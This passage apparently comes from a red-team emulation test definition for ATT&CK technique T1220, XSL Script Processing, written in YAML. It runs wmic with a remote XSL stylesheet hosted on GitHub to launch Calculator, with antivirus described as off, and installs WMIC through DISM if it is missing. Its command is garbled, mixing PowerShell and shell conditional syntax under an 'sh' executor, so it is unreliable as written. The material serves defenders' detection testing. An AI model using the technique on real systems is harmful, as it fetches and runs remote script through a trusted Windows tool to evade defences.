    Open Calculator.exe when test successfully executed, while AV turned off.
  tactic: stealth
  technique:
    attack_id: T1220
    name: XSL Script Processing
  platforms:
    windows:
      sh:
        command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0}
          else {exit 1}; then : ; else DISM /Online /Add-Capability /CapabilityName:WMIC~~~~;
          fi; wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"'
